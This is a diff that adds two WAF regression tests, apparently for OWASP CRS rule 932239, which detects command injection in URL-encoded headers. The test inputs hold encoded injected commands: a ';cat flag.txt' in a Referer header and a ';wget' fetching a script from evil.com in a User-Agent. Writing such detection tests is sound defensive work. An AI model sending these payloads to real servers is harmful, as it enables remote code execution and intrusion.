@@ -1091,3 +1091,35 @@ tests:
         output:
           log:
             expect_ids: [932239]
+  - test_id: 65
+    desc: "Detect RCE in URL-encoded Referer (issue #3504): %3Bcat%20flag decoded by urlDecodeUni"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "OWASP CRS test agent"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            Referer: "https://example.com/?redirect=%3Bcat%20flag.txt"
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932239]
+  - test_id: 66
+    desc: "Detect RCE in URL-encoded User-Agent (issue #3504): %3Bwget payload decoded"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "Mozilla/5.0 %3Bwget%20http%3A%2F%2Fevil.com%2Fs.sh"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/get"
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932239]
